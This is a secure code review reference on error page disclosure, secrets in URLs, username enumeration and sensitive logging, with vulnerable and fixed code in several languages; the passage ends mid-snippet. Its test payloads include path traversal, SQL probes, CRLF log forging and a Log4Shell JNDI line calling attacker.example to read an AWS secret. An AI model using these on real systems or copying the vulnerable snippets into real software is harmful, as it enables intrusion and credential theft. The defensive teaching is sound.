---
title: "4.7 Code Reference — Review Information Disclosure and Logging"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Information Disclosure and Logging.
---

# 4.7 Code Reference — Review Information Disclosure and Logging

## Error page disclosure {: #errors }

From former `4-22-review-error-page-disclosure.md`. **Guiding chapter section:** [4.7 - Review Information Disclosure and Logging § Error page disclosure](../../4-07-review-information-disclosure-and-logging.md#errors).

# 4.22 Code Reference — Review Error Page Disclosure

## Attack Payloads

Use these in authorized tests to trigger failures and inspect responses. Goal is to see whether stack traces, paths, or versions leak—not to exploit injection.

### Pattern 1: Type and format errors

```http
GET /api/users/not-a-number HTTP/1.1
POST /api/order {"quantity": "abc"} HTTP/1.1
Content-Type: application/json

{"id": null}
```

### Pattern 2: Missing resources and path probes

```http
GET /api/users/999999999 HTTP/1.1
GET /../../../etc/passwd HTTP/1.1
GET /%00/report HTTP/1.1
```

### Pattern 3: Database and query failures

```http
GET /search?q=' HTTP/1.1
GET /report?sort=invalid_column HTTP/1.1
```

May return SQL syntax fragments, table names, or ORM query text in the body.

### Pattern 4: Unhandled exceptions in business logic

```http
POST /transfer {"amount": -1, "to": ""} HTTP/1.1
GET /export?format=__invalid__ HTTP/1.1
```

Divide-by-zero, null dereference, or assertion failures if not caught by a generic handler.

### Pattern 5: Debug and health endpoints

```http
GET /error?debug=1 HTTP/1.1
GET /__debug__/ HTTP/1.1
TRACE / HTTP/1.1
```

## Language-Specific Sinks and Dangerous APIs

Find code paths that write exception details, stack traces, or framework diagnostics into HTTP responses.

### Python

```python
import traceback
return {"trace": traceback.format_exc()}, 500
app.run(debug=True)
# Flask/Werkzeug debugger, Django DEBUG=True in prod settings
```

Django: `DEBUG` template with stack trace. FastAPI: unhandled exception returns default detail with path.

### Java

```java
e.printStackTrace(response.getWriter());
return ResponseEntity.status(500).body(e.toString());
server.error.include-stacktrace=always
```

Spring Boot: `server.error.include-message`, `include-binding-errors`. Servlet container default error pages.

### C#

```csharp
catch (Exception ex) {
    return Content(ex.ToString());
}
app.UseDeveloperExceptionPage();  // enabled in Production
```

ASP.NET Core: `DeveloperExceptionPageMiddleware`, `IncludeErrorDetail=true` on APIs.

### JavaScript (Node.js)

```javascript
res.status(500).json({ error: err.message, stack: err.stack });
app.use((err, req, res, next) => res.send(err.stack));
process.env.NODE_ENV = 'development';
```

Express error handler returning `err.stack`; Next.js dev overlay config in production build.

### Go

```go
http.Error(w, err.Error(), 500)
fmt.Fprintf(w, "%+v\n", debug.Stack())
```

`panic` without `recover` middleware; `log.Printf` then echoing `err` to client.

### PHP

```php
catch (Exception $e) { echo $e->getTraceAsString(); }
ini_set('display_errors', '1');
```

Laravel `APP_DEBUG=true` in deployed `.env`.

### Reverse proxy / server config

```nginx
# Default nginx/Apache 502 pages with version
proxy_intercept_errors off;  # upstream stack body passed through
```

## Vulnerable Examples in Other Languages

### Java

```java
try {
    processOrder(orderId);
} catch (Exception e) {
    e.printStackTrace(response.getWriter());
}
```

### C#

```csharp
catch (Exception ex)
{
    return StatusCode(500, new { message = ex.Message, stack = ex.StackTrace });
}
```

### Go

```go
func handler(w http.ResponseWriter, r *http.Request) {
    if err := runJob(); err != nil {
        w.WriteHeader(http.StatusInternalServerError)
        fmt.Fprintf(w, "%+v", err)
        return
    }
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Register error handlers that return generic messages. Log full exceptions server-side with a correlation ID.

```python
import traceback
import logging
import uuid
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()
logger = logging.getLogger("reports")

@app.exception_handler(Exception)
async def handle_error(request, exc):
    request_id = str(uuid.uuid4())
    logger.exception("unhandled error request_id=%s", request_id)
    return JSONResponse(
        {"error": "An internal error occurred.", "request_id": request_id},
        status_code=500,
    )

@app.get("/reports/run")
async def run_report():
    return await generate_report()
```

**Important:** Keep Django `DEBUG=False` in production. Use `handler500` and logging settings for details. Never return `traceback.format_exc()` to users.

### Java

Map errors to static pages in `web.xml`. Configure Spring Boot to exclude stack traces in production.

```xml
<error-page>
  <exception-type>java.lang.Exception</exception-type>
  <location>/error/generic.html</location>
</error-page>
<error-page>
  <error-code>500</error-code>
  <location>/error/500.html</location>
</error-page>
```

```properties
# application-prod.properties
server.error.include-stacktrace=never
server.error.include-message=never
server.error.include-exception=false
```

```java
@ControllerAdvice
public class GlobalErrors {
    private static final Logger log = LoggerFactory.getLogger(GlobalErrors.class);

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ProblemDetail> handle(Exception ex) {
        String id = UUID.randomUUID().toString();
        log.error("request_id={}", id, ex);
        ProblemDetail body = ProblemDetail.forStatus(HttpStatus.INTERNAL_SERVER_ERROR);
        body.setTitle("Internal error");
        body.setProperty("request_id", id);
        return ResponseEntity.status(500).body(body);
    }
}
```

**Important:** Log full exceptions with SLF4J. Return RFC 7807 Problem Details without internal paths in public APIs.

### C#

Use exception handler middleware in production. Restrict developer exception page to Development environment.

```csharp
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler("/error");
    app.UseHsts();
}

app.Map("/error", () => Results.Problem(
    title: "An error occurred.",
    statusCode: StatusCodes.Status500InternalServerError));
```

```csharp
catch (Exception ex)
{
    var requestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier;
    _logger.LogError(ex, "Unhandled error {RequestId}", requestId);
    return StatusCode(500, new { error = "An internal error occurred.", requestId });
}
```

**Important:** Set `DetailedErrors=false` in production. Map to ProblemDetails without stack traces.

### Go

Return generic HTTP errors. Log errors with structured logging and recover from panics in middleware.

```go
func handler(w http.ResponseWriter, r *http.Request) {
    if err := runJob(); err != nil {
        requestID := middleware.RequestIDFromContext(r.Context())
        slog.Error("job failed", "request_id", requestID, "err", err)
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }
}

func recoverMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        defer func() {
            if rec := recover(); rec != nil {
                slog.Error("panic", "recover", rec)
                http.Error(w, "internal error", http.StatusInternalServerError)
            }
        }()
        next.ServeHTTP(w, r)
    })
}
```

**Important:** Disable Gin/Echo debug mode in production. Use nginx or Envoy custom error pages as defense in depth.

## Sensitive data in URL {: #url-data }

From former `4-23-review-sensitive-data-in-url.md`. **Guiding chapter section:** [4.7 - Review Information Disclosure and Logging § Sensitive data in URL](../../4-07-review-information-disclosure-and-logging.md#url-data).

# 4.23 Code Reference — Review Sensitive Data in URL

## Attack Payloads

Use these in authorized tests when secrets may appear in GET URLs, redirects, or Referer headers. Replace placeholders with your test values.

### Pattern 1: Credentials in query string (login abuse scenario)

```http
GET /login?user=admin&password=Secret123! HTTP/1.1
Host: app.example
```

The same request may be stored in proxy access logs, browser history, and analytics that capture full URIs.

### Pattern 2: API key and bearer token in URL

```http
GET /api/report?api_key=sk_live_abc123 HTTP/1.1
GET /download?access_token=eyJhbGciOiJIUzI1NiJ9... HTTP/1.1
```

### Pattern 3: Password reset and magic-link tokens

```http
GET /reset/confirm?token=8f3c2a1b9e7d4f6a HTTP/1.1
GET /magic-login?session=deadbeefcafebabe HTTP/1.1
```

Shareable links and email clients may retain the full URL indefinitely.

### Pattern 4: Redirect that echoes secrets

```http
HTTP/1.1 302 Found
Location: /dashboard?token=eyJhbGciOiJIUzI1NiJ9...
```

### Pattern 5: Referer exfiltration to third party

```html
<a href="https://analytics.example/landing">Continue</a>
```

When the prior page URL is `https://app.example/home?token=SECRET`, the browser may send:

```http
Referer: https://app.example/home?token=SECRET
```

### Pattern 6: OAuth and SSO callback tokens in query

```http
GET /oauth/callback?code=AUTH_CODE&state=xyz HTTP/1.1
GET /sso/callback?access_token=LONG_LIVED_TOKEN HTTP/1.1
```

## Language-Specific Sinks and Dangerous APIs

Search for bindings and builders that place secrets in the URL path or query string.

### Python

```python
pwd = request.args.get("password")
return redirect(f"/home?user={user}&token={token}")
logger.info("login url=%s", request.url)  # full URI with query
```

Flask `request.url`, `request.full_path`; FastAPI `Query()` on sensitive fields; Django `request.GET["password"]`.

### Java

```java
@GetMapping("/auth")
public void auth(@RequestParam String password) { ... }

resp.sendRedirect("/app?token=" + accessToken);
String uri = req.getRequestURI() + "?" + req.getQueryString();
log.info("request {}", uri);
```

Spring `@RequestParam` on GET login; servlet `getQueryString()` logged verbatim.

### C#

```csharp
[HttpGet("auth")]
public IActionResult Auth([FromQuery] string password) { ... }

return Redirect($"/dashboard?token={accessToken}");
_logger.LogInformation("Request {Url}", Request.GetDisplayUrl());
```

### JavaScript

```javascript
const token = new URLSearchParams(location.search).get("token");
window.location = `/app?api_key=${apiKey}`;
fetch(`/proxy?url=${encodeURIComponent(secretUrl)}`);
```

Front-end routers that sync tokens into `history.pushState` query params.

### Go

```go
pass := r.URL.Query().Get("password")
http.Redirect(w, r, "/home?token="+token, http.StatusFound)
log.Printf("uri=%s", r.URL.String())
```

### Access and APM logging

```text
# nginx / load balancer access log line
GET /login?password=Secret123! HTTP/1.1" 200
```

## Vulnerable Examples in Other Languages

### Java

```java
@WebServlet("/login")
public class LoginServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        String email = req.getParameter("email");
        String password = req.getParameter("password");
        if (email != null && password != null) {
            authenticate(email, password);
        }
        req.getRequestDispatcher("/login.jsp").forward(req, resp);
    }
}

@GetMapping("/reset/confirm")
public String confirmReset(@RequestParam String token, Model model) {
    model.addAttribute("token", token); // token visible in browser address bar
    return "reset-form";
}
```

### C#

```csharp
[HttpGet("auth")]
public IActionResult Auth([FromQuery] string username, [FromQuery] string password)
{
    var ok = _auth.Validate(username, password);
    return ok ? Ok() : Unauthorized();
}

[HttpGet("sso/callback")]
public IActionResult SsoCallback([FromQuery] string accessToken)
{
    // Token in query string — logged by proxies and sent in Referer
    SignInWithToken(accessToken);
    return Redirect($"/dashboard?token={accessToken}");
}
```

### Go

```go
func login(w http.ResponseWriter, r *http.Request) {
    user := r.URL.Query().Get("user")
    pass := r.URL.Query().Get("pass")
    if authenticate(user, pass) {
        http.Redirect(w, r, "/home", http.StatusFound)
    }
}

func apiProxy(w http.ResponseWriter, r *http.Request) {
    key := r.URL.Query().Get("api_key")
    resp, _ := http.Get("https://partner.example/api?key=" + key)
    io.Copy(w, resp.Body)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Accept credentials only on POST. Reject GET with password parameters. Put API keys in headers, not query strings.

```python
from flask import Flask, request, redirect, render_template
from flask.views import MethodView

app = Flask(__name__)

class LoginView(MethodView):
    def get(self):
        return render_template("login.html")

    def post(self):
        user = request.form["user"]
        pwd = request.form["password"]
        if do_login(user, pwd):
            return redirect("/home")  # clean URL, no echoed secrets
        return render_template("login.html", error="Invalid credentials"), 401

app.add_url_rule("/login", view_func=LoginView.as_view("login"), methods=["GET", "POST"])
```

```python
# API keys belong in headers, not query strings
from fastapi import Header, HTTPException

async def verify_api_key(x_api_key: str = Header(..., alias="X-API-Key")):
    if not valid_key(x_api_key):
        raise HTTPException(status_code=401)
```

**Important:** After login or reset, redirect to URLs that strip tokens from the visible address bar.

### Java

Use POST-only form login. Configure access logging to omit query strings on sensitive paths.

```java
@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
    String email = req.getParameter("email");
    String password = req.getParameter("password");
    authenticate(email, password);
    resp.sendRedirect(req.getContextPath() + "/home");
}

@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
    req.getRequestDispatcher("/login.jsp").forward(req, resp);
}
```

```java
// Spring Security: form login POST endpoint only
http.formLogin(form -> form.loginPage("/login").loginProcessingUrl("/login"));
```

### C#

Bind credentials from the form body. Disable GET on the same action.

```csharp
[HttpPost("auth")]
public IActionResult Auth([FromForm] string username, [FromForm] string password)
{
    var ok = _auth.Validate(username, password);
    return ok ? RedirectToAction("Home") : Unauthorized();
}
```

```csharp
// Response header on sensitive pages
Response.Headers["Referrer-Policy"] = "no-referrer";
```

### Go

Read credentials only after confirming POST. Return 405 for GET with password query params.

```go
func login(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
        return
    }
    if err := r.ParseForm(); err != nil {
        http.Error(w, "bad request", http.StatusBadRequest)
        return
    }
    user := r.FormValue("user")
    pass := r.FormValue("pass")
    if authenticate(user, pass) {
        http.Redirect(w, r, "/home", http.StatusSeeOther)
    }
}
```

## Username enumeration {: #enumeration }

From former `4-24-review-username-enumeration.md`. **Guiding chapter section:** [4.7 - Review Information Disclosure and Logging § Username enumeration](../../4-07-review-information-disclosure-and-logging.md#enumeration).

# 4.24 Code Reference — Review Username Enumeration

## Attack Payloads

Use these in authorized tests on login, registration, and password reset. Compare body, status code, headers, and timing for known-valid versus unknown identifiers.

### Pattern 1: Distinct error messages (login abuse scenario)

```http
POST /login
{"user":"known@victim.com","password":"wrong"}
→ {"error":"Invalid password"}

POST /login
{"user":"unknown@attacker.com","password":"wrong"}
→ {"error":"User does not exist"}
```

### Pattern 2: HTTP status discrepancy

```http
POST /reset {"email":"registered@victim.com"} → 200 OK
POST /reset {"email":"notregistered@x.com"}    → 404 Not Found
```

### Pattern 3: Registration and invite flows

```http
POST /register {"email":"taken@victim.com"}
→ {"error":"Email already registered"}

POST /register {"email":"new@attacker.com"}
→ {"ok":true}
```

### Pattern 4: JSON existence flags

```json
{"exists": true, "message": "Check your email"}
{"exists": false, "message": "No account found"}
```

### Pattern 5: Timing side channel

Repeated requests for unknown emails may return faster when the server skips mail queue or DB work. Measure response time distributions across many samples.

### Pattern 6: Password reset email behavior

Observe whether an outbound email is sent only when the account exists, or whether UI text differs ("We sent a link" vs "Unknown user").

## Language-Specific Sinks and Dangerous APIs

Search for branches that return different content when a user record is missing versus present.

### Python

```python
if not user:
    return jsonify({"error": "No account with that email"}), 404
return jsonify({"error": "Invalid password"})  # reveals valid user
```

Django `authenticate` followed by distinct messages; Flask `flash()` with different strings.

### Java

```java
if (user == null) {
    resp.sendError(404, "User not found");
} else {
    resp.sendError(401, "Bad password");
}
return Map.of("registered", user != null);
```

Spring Security custom `AuthenticationFailureHandler` with per-case messages.

### C#

```csharp
if (user == null)
    return NotFound("Email not registered");
return Unauthorized("Wrong password");
```

ASP.NET Identity error descriptions exposed to the client.

### JavaScript

```javascript
if (!user) return res.status(404).json({ error: "Unknown email" });
return res.status(401).json({ error: "Wrong password" });
```

### Go

```go
if user == nil {
    http.Error(w, "no such user", http.StatusNotFound)
    return
}
```

### HTML and template leaks

```html
<!-- Reset form only rendered when user exists -->
{% if user_found %}<p>Email sent</p>{% else %}<p>Unknown account</p>{% endif %}
```

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/reset")
public String reset(@RequestParam String username, Model model) {
    Optional<User> user = userRepository.findByUsername(username);
    if (user.isEmpty()) {
        model.addAttribute("message", "User does not exist");
        return "reset";
    }
    mailService.sendReset(user.get());
    model.addAttribute("message", "The password reset link has been sent to you.");
    return "reset";
}

@PostMapping("/register")
public ResponseEntity<?> register(@RequestBody RegisterRequest req) {
    if (userRepository.existsByEmail(req.getEmail())) {
        return ResponseEntity.status(409).body(Map.of("error", "Email already registered"));
    }
    userRepository.save(new User(req.getEmail(), req.getPassword()));
    return ResponseEntity.ok(Map.of("message", "Account created"));
}
```

### C#

```csharp
[HttpPost("forgot-password")]
public async Task<IActionResult> ForgotPassword([FromForm] string email)
{
    var user = await _users.FindByEmailAsync(email);
    if (user == null)
        return BadRequest("Unknown email address.");
    await _email.SendResetAsync(user);
    return Ok("Check your email.");
}

[HttpPost("login")]
public IActionResult Login([FromBody] LoginDto dto)
{
    var user = _users.FindByName(dto.Username);
    if (user == null)
        return Unauthorized(new { error = "user_not_found" });
    if (!_hasher.Verify(dto.Password, user.PasswordHash))
        return Unauthorized(new { error = "bad_password" });
    return Ok(SignIn(user));
}
```

### Go

```go
func forgot(w http.ResponseWriter, r *http.Request) {
    email := r.FormValue("email")
    u, err := store.UserByEmail(email)
    if err == sql.ErrNoRows {
        http.Error(w, "user not found", http.StatusNotFound)
        return
    }
    mailer.SendReset(u)
    w.Write([]byte("email sent"))
}

func register(w http.ResponseWriter, r *http.Request) {
    email := r.FormValue("email")
    if store.EmailExists(email) {
        http.Error(w, "email already registered", http.StatusConflict)
        return
    }
    store.CreateUser(email, r.FormValue("password"))
    w.WriteHeader(http.StatusCreated)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Return the same message and status regardless of lookup result. Send email only server-side when the user exists.

```python
from flask import Flask, request, render_template

app = Flask(__name__)
GENERIC_RESET_MSG = "If an account exists for that email, we sent reset instructions."

@app.post("/reset")
def reset():
    email = request.form["email"]
    user = User.query.filter_by(email=email).first()
    if user:
        send_reset(user)
    # Always the same response — no branch on user is None
    return render_template("reset_sent.html", message=GENERIC_RESET_MSG), 200
```

```python
import time
import bcrypt

DUMMY_HASH = bcrypt.hashpw(b"dummy", bcrypt.gensalt())

def verify_login(username, password):
    user = User.query.filter_by(username=username).first()
    if user:
        return bcrypt.checkpw(password.encode(), user.password_hash.encode())
    # Align timing when user is missing
    bcrypt.checkpw(password.encode(), DUMMY_HASH)
    return False
```

**Important:** Rate-limit reset and login endpoints per IP and identifier to slow enumeration even with uniform responses.

### Java

Use consistent messaging. Perform similar work when the user is absent to reduce timing gaps.

```java
private static final String RESET_MESSAGE =
    "If an account exists, we sent password reset instructions.";

public void handleReset(HttpServletRequest req, HttpServletResponse resp) {
    String username = req.getParameter("username");
    Optional<User> user = userRepository.findByUsername(username);
    user.ifPresent(u -> {
        String token = tokenService.createResetToken(u);
        mailService.sendReset(u.getEmail(), token);
    });
    req.setAttribute("message", RESET_MESSAGE);
    doForward(req, resp);
}
```

### C#

Return identical response body and status for found and not-found email on reset.

```csharp
private const string ResetMessage =
    "If an account exists for that email, we sent reset instructions.";

[HttpPost("forgot-password")]
public IActionResult ForgotPassword([FromForm] string email)
{
    var user = await _users.FindByEmailAsync(email);
    if (user != null)
        await _email.SendResetAsync(user);
    return Ok(ResetMessage);
}
```

### Go

Use one success response for forgot-password regardless of `ErrNoRows`.

```go
const resetMsg = "If an account exists for that email, we sent reset instructions."

func forgot(w http.ResponseWriter, r *http.Request) {
    email := r.FormValue("email")
    u, err := store.UserByEmail(email)
    if err == nil {
        mailer.SendReset(u)
    }
    w.WriteHeader(http.StatusOK)
    w.Write([]byte(resetMsg))
}
```

## Sensitive logging {: #sensitive-logging }

From former `4-26-review-sensitive-logging.md`. **Guiding chapter section:** [4.7 - Review Information Disclosure and Logging § Sensitive logging](../../4-07-review-information-disclosure-and-logging.md#sensitive-logging).

# 4.26 Code Reference — Review Sensitive Logging

## Attack Payloads

These are abuse scenarios for what attackers or insiders may recover from logs—not payloads to send to the app. Use them to design log review checklists and redaction tests.

### Pattern 1: Credential capture in application logs

```text
INFO login attempt user=admin password=Secret123!
DEBUG auth body={"password":"x","token":"eyJ..."}
```

### Pattern 2: Token and session leakage

```text
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Set-Cookie: session=deadbeef; Path=/
API key validated: sk_live_abc123xyz
```

### Pattern 3: Payment and regulated data

```text
card=4111111111111111 cvv=123 exp=12/29
ssn=123-45-6789
```

### Pattern 4: Log injection via user-controlled fields (secondary risk)

```text
username=admin%0aINFO Forged audit: admin logged in
```

Newline or forged severity in usernames may confuse parsers or SIEM rules.

### Pattern 5: Exception and stack trace disclosure

```text
SQLException: connection failed for user 'dbadmin' password 'DbP@ss!' at jdbc:mysql://internal-db:3306/prod
```

### Pattern 6: Full request dumps in debug mode

```text
REQUEST_HEADERS={... Authorization: Bearer ... Cookie: session=...}
REQUEST_BODY={"password":"..."}
```

## Language-Specific Sinks and Dangerous APIs

Search for log calls and serializers that include request objects, headers, or exception messages with user data.

### Python

```python
logger.info("login %s %s", user, password)
logger.debug("headers %s body %s", request.headers, request.get_data())
app.logger.exception(e)  # may include SQL with secrets
```

`print(request.json)` in containers; structlog with unfiltered `request` dict.

### Java

```java
log.info("token={}", accessToken);
log.debug("request {}", request.toString());
e.printStackTrace();  // stderr captured by log agents
```

Log4j/SLF4J MDC with full `Authorization` header; Spring `CommonsRequestLoggingFilter` without masking.

### C#

```csharp
_logger.LogInformation("Password {Pwd}", password);
_logger.LogDebug("Request {@Request}", request);
```

Serilog destructuring of entire request DTOs; `ILogger` with connection strings in messages.

### JavaScript

```javascript
console.log("auth", req.headers.authorization, req.body);
logger.info({ headers: req.headers, body: req.body });
```

Winston/Pino serializers that pass through `req` unchanged.

### Go

```go
log.Printf("login user=%s pass=%s", user, pass)
log.Printf("req=%+v", r)  // may dump Authorization header
```

### Access and infrastructure logs

```text
# nginx — full URI with secrets if clients use GET login
GET /login?password=secret HTTP/1.1
```

## Vulnerable Examples in Other Languages

### Java

```java
public void login(String username, String password) {
    logger.info("Login attempt user={} password={}", username, password);
    boolean ok = authService.authenticate(username, password);
    logger.info("Login result user={} success={}", username, ok);
}

@ExceptionHandler(Exception.class)
public ResponseEntity<String> handleError(Exception ex, HttpServletRequest req) {
    logger.error("request failed uri={} query={} body={}",
        req.getRequestURI(), req.getQueryString(), readBody(req), ex);
    return ResponseEntity.status(500).body(ex.getMessage());
}
```

### C#

```csharp
[HttpPost("pay")]
public IActionResult Pay([FromBody] PaymentRequest req)
{
    _logger.LogDebug("charge payload {@Card}", req.Card);
    return Ok(_billing.Charge(req));
}

[HttpGet("admin/sync")]
public IActionResult Sync()
{
    _logger.LogInformation("API call Authorization: {Auth}",
        Request.Headers["Authorization"]);
    return Ok(_sync.Run());
}
```

### Go

```go
func reset(w http.ResponseWriter, r *http.Request) {
    token := generateToken()
    log.Printf("issued reset token=%s for %s", token, r.FormValue("email"))
    mailer.SendReset(r.FormValue("email"), token)
}

func pay(w http.ResponseWriter, r *http.Request) {
    var payload map[string]interface{}
    json.NewDecoder(r.Body).Decode(&payload)
    log.Printf("charge request=%+v", payload) // may include PAN and CVV
    processPayment(payload)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Log event metadata, not secrets. Use filters to redact sensitive keys before emit.

```python
import logging
import re

SENSITIVE_KEYS = re.compile(r"(password|token|secret|authorization|cvv|pan)", re.I)

class RedactFilter(logging.Filter):
    def filter(self, record):
        if isinstance(record.msg, str):
            record.msg = SENSITIVE_KEYS.sub("[REDACTED]", record.msg)
        return True

@app.post("/pay")
def pay():
    payload = request.json
    current_app.logger.info(
        "charge_attempt user_id=%s amount=%s result=pending",
        session.get("user_id"),
        payload.get("amount"),
    )
    return charge(payload)
```

```python
# Register filter on the app logger
logging.getLogger("werkzeug").addFilter(RedactFilter())
```

**Important:** Never log `request.data`, `request.form`, or full headers on authentication routes.

### Java

Use structured logging with fixed fields. Never pass raw passwords to the logger.

```java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;

private static final Logger log = LoggerFactory.getLogger(AuthService.class);

public void login(String username, String password) {
    MDC.put("event", "LOGIN_ATTEMPT");
    MDC.put("username", username);
    boolean ok = authenticate(username, password);
    log.info("login result={}", ok ? "SUCCESS" : "FAILURE");
    MDC.clear();
}
```

### C#

Use explicit log templates. Do not pass raw header dictionaries.

```csharp
_logger.LogInformation(
    "Login attempt for user {UserId} result {Result}",
    userId,
    success ? "Success" : "Failure");
```

```csharp
// Serilog destructuring policy example
Log.Logger = new LoggerConfiguration()
    .Destructure.ByTransforming<LoginRequest>(r => new { r.Username })
    .CreateLogger();
```

### Go

Use `slog` with an allowlist of attributes. Implement `LogValuer` for types that redact secrets.

```go
import "log/slog"

func handleLogin(w http.ResponseWriter, r *http.Request) {
    user := r.FormValue("user")
    ok := authenticate(user, r.FormValue("pass"))
    slog.Info("login_attempt",
        slog.String("user", user),
        slog.String("result", map[bool]string{true: "success", false: "failure"}[ok]),
    )
}
```

```go
type redactedString string

func (s redactedString) LogValue() slog.Value {
    return slog.StringValue("[REDACTED]")
}
```

## Secure logging {: #secure-logging }

From former `4-40-review-secure-logging.md`. **Guiding chapter section:** [4.7 - Review Information Disclosure and Logging § Secure logging](../../4-07-review-information-disclosure-and-logging.md#secure-logging).

# 4.40 Code Reference — Review Secure Logging

## Attack Payloads

Use these in authorized tests when user input appears in log messages or when reviewing log aggregation exposure.

### Pattern 1: Log injection (CRLF / forged lines)

```text
username=admin%0aINFO User admin logged out successfully
username=legit%0d%0aERROR Security audit: privilege escalation approved
event=checkout%0a2024-06-01 WARN refund approved txn=99999 amount=50000
```

Forged newlines may confuse operators or SIEM parsers that treat each line as a separate event.

### Pattern 2: Log forging via Unicode / homoglyphs

```text
username=аdmin  # Cyrillic 'а' — looks like "admin" in log review
username=\u001b[31madmin  # ANSI escape in terminals that render color
```

### Pattern 3: Sensitive data in query strings (Referer leakage)

```text
GET /login?username=victim&password=Secret123
Referer: https://app.example/dashboard?token=eyJhbG...
```

Even when not logged by the app, proxies and analytics may capture query parameters.

### Pattern 4: Verbose exception logging

```text
# Trigger validation error; stack trace includes:
# connection string, API key in local variable dump, Authorization header
```

### Pattern 5: Log4Shell-style JNDI (legacy)

```text
${jndi:ldap://attacker.example/a}
${env:AWS_SECRET_ACCESS_KEY}
```

Review JNDI lookup patterns in Java logging configuration for legacy deployments.

## Language-Specific Sinks and Dangerous APIs

### Python

```python
app.logger.info("Login user=%s password=%s", user, password)
logger.debug("Request: %s", request)  # entire Flask/Django request
logger.info(f"Token: {token}")
structlog.get_logger().info("auth", authorization=headers["Authorization"])
print(request.headers)  # stdout captured by container logs
logging.basicConfig(level=logging.DEBUG)  # in production settings
```

Also review: `urllib3` debug, SQLAlchemy `echo=True`, Celery task logs with args.

### Java

```java
logger.info("Login user={} password={}", username, password);
log.debug("JWT {}", jwtToken);
System.out.println("DB URL: " + jdbcUrl);
log.error("Failed payment", exception);  // exception message contains PAN
MDC.put("ssn", ssn);  // mapped diagnostic context in every line
org.apache.logging.log4j.core.lookup.JndiLookup  // legacy config
```

### C#

```csharp
_logger.LogInformation("Password {Password}", password);
_logger.LogDebug("Request {@Request}", request);  // destructures all properties
Console.WriteLine($"Connection: {connectionString}");
_logger.LogError(ex, "Payment failed for {Pan}", cardNumber);
Serilog destructuring of sensitive objects without masking
```

### Go

```go
log.Printf("login user=%s password=%s", user, pass)
log.Printf("auth header=%s", r.Header.Get("Authorization"))
fmt.Println(req)  // httputil.DumpRequest output
zap.String("token", token)
log.SetFlags(log.LstdFlags | log.Lshortfile) // with secrets in messages
```

### JavaScript

```javascript
console.log('User login:', { username, password });
console.log('Headers:', req.headers);
logger.info(`Stripe key: ${process.env.STRIPE_SECRET}`);
debug('session', req.session);  // debug package in production
```

### Shell / infrastructure

```bash
export DATABASE_URL="postgres://user:pass@host/db"  # visible in /proc, docker inspect
kubectl logs deployment/api  # env vars printed at startup
```

## Vulnerable Examples in Other Languages

### Java

```java
logger.info("Login attempt user={} password={}", username, password);

public void login(String username, String password) {
    if (authenticate(username, password)) {
        String sessionId = createSession(username);
        logger.info("Login ok session={}", sessionId);
    }
}

logger.info("Reset link for {}: {}", email, resetToken);
logger.error("DB connection failed: {}", jdbcUrlWithCredentials);
```

### C#

```csharp
_logger.LogInformation("Login attempt user={User} password={Password}", username, password);

_logger.LogInformation("User {UserId} authenticated with token {Token}", userId, accessToken);
_logger.LogInformation("Reset link for {Email}: {Token}", email, resetToken);
_logger.LogError(ex, "Payment failed for card {Pan}", payment.CardNumber);
```

### Go

```go
func login(w http.ResponseWriter, r *http.Request) {
    user := r.FormValue("username")
    pass := r.FormValue("password")
    log.Printf("login attempt user=%s password=%s", user, pass)
    if authenticate(user, pass) {
        sid := createSession(user)
        log.Printf("login ok session=%s auth=%s", sid, r.Header.Get("Authorization"))
    }
}

func reset(w http.ResponseWriter, r *http.Request) {
    token := issueResetToken(r.FormValue("email"))
    log.Printf("issued reset token=%s for %s", token, r.FormValue("email"))
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Log security events with correlation IDs, not credentials. Redact sensitive keys in structured logs.

```python
import logging
import structlog

def redact_sensitive(_, __, event_dict):
    for key in ("password", "token", "authorization", "cookie"):
        if key in event_dict:
            event_dict[key] = "[REDACTED]"
    return event_dict

structlog.configure(processors=[redact_sensitive, structlog.processors.JSONRenderer()])
log = structlog.get_logger()

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    if authenticate(username, password):
        log.info("login_success", user_id=user_id_for(username), event="LOGIN_SUCCESS")
        return redirect("/dashboard")
    log.warning("login_failure", username=username, event="LOGIN_FAILURE")
    return "failed", 401
```

Set `LOG_LEVEL=INFO` in production. See [Python logging](https://docs.python.org/3/library/logging.html) and [structlog](https://www.structlog.org/en/stable/).

### Java

Use parameterized logging without secrets. Add redaction filters for known patterns.

```java
logger.info("Login attempt user={} outcome={}", username, success ? "SUCCESS" : "FAILURE");

public class RedactFilter extends Filter<ILoggingEvent> {
    @Override
    public FilterReply decide(ILoggingEvent event) {
        if (event.getFormattedMessage().contains("password=")) {
            return FilterReply.DENY;
        }
        return FilterReply.NEUTRAL;
    }
}
```

Align event coverage with [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/) logging requirements.

### C#

Use ILogger with explicit templates. Mask sensitive properties in Serilog destructuring.

```csharp
_logger.LogInformation("Login {Outcome} for user {UserId}", outcome, userId);

Log.Logger = new LoggerConfiguration()
    .Destructure.ByTransforming<PaymentInfo>(p => new { p.TransactionId, Pan = "[REDACTED]" })
    .CreateLogger();
```

Configure [Application Insights telemetry filters](https://learn.microsoft.com/en-us/azure/azure-monitor/app/api-filtering-sampling) to drop Authorization headers.

### Go

Log user IDs and correlation IDs, not raw Authorization headers or passwords.

```go
logger.Info("login",
